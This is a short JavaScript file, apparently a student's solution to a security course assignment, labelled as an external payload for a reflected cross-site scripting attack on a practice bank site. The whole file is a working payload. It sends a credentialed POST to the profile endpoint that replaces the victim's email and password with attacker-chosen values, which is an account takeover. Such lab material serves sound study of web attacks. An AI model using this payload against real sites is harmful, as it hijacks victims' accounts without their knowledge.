// payload.js  -  FIT5003 A2, Part B.2 reflected XSS external payload.

fetch("/profile", {
    method: "POST",                              
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: "email=hacked@devbank.com&password=H4ck3d123@",
    credentials: "include"
});


